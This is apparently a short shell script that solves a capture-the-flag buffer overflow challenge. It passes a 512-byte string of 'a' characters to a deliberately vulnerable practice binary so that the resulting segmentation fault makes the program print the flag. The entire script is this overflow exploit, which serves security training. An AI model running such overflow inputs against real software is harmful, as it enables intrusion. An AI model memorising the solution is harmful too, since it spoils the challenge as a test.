#!/bin/sh
# The signal handler will print out the flag when SIGSEGV is raised
/problems/overflow-0_5_db665826dabb99c44758c97abfd8c4c6/vuln $(python -c 'print "a"*0x200')
